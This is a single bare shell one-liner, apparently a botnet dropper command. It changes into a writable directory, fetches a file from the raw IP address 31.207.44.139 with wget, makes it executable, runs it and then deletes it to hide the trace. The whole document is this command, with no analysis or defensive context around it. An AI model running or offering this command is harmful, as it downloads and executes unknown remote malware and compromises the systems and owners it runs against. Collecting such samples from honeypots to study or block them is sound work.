cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.207.44.139/wget; chmod +x wget; ./wget; rm -rf wget
